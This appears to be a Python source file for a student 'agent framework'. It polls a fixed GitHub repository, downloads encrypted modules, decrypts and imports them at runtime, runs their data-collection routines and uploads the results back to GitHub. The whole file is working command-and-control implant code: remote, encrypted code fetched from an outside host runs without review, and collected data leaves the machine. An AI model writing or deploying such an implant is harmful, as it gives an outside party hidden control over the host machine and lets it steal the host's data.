import time
import os
import sys
import git
import shutil
import importlib
from github_connector import GitHubConnector
from encryption import Encryption

class Agent:
    """The agent class is responsible for checking the GitHub repository for updates and executing the necessary actions."""
    def __init__(self):
        self.repository_url = "https://github.com/ErniedM/eindopdracht-agent-framework"
        self.key_path = "key.txt"
        self.time_path = "config/time.txt"
        self.github_connector = GitHubConnector(self.repository_url)
        self.encryption = Encryption(self.key_path)

    def run(self):
        """The run method is responsible for checking the GitHub repository for updates and executing the necessary actions."""
        while True:
            # Check the time interval
            with open(self.time_path, "r") as file:
                set_time = int(file.read())
            # Check the GitHub repository for updates
            if self.github_connector.check_for_updates():
                # Fetch the configuration file
                config = self.github_connector.get_config()
                self.execute_actions(config)
            time.sleep(set_time)  # Wait for 3 minutes before the next check

    def execute_actions(self, config):
        """The execute_actions method is responsible for executing the necessary actions."""
        for action in config:
            module_name = action["module_name"]
            class_name = action["class_name"]
            # Clone the repository to a local directory
            local_directory = "temp_directory"
            repo = git.Repo.clone_from(self.repository_url, local_directory)
            # Decrypt the module file
            self.encryption.decrypt_file(f"{local_directory}/modules/{module_name}.py", f"{local_directory}/modules/{module_name}_decrypted.py")
            try:
                # Add the local directory to the system path for module import
                sys.path.append(os.path.join(os.path.dirname(__file__), "temp_directory"))
                # Dynamically import the module and perform the necessary actions
                module = importlib.import_module(f"modules.{module_name}_decrypted")
                module_class = getattr(module, class_name)
                module_instance = module_class()
                data = module_instance.collect_data()
                # Remove the local directory
                repo.close()
                shutil.rmtree(local_directory)
                self.github_connector.log_data(data)
            except ImportError:
                print(f"Error importing module: {module_name}")
            except Exception as e:
                print(f"Error executing module: {module_name}. Error message: {str(e)}")

if __name__ == "__main__":
    agent = Agent()
    agent.run()
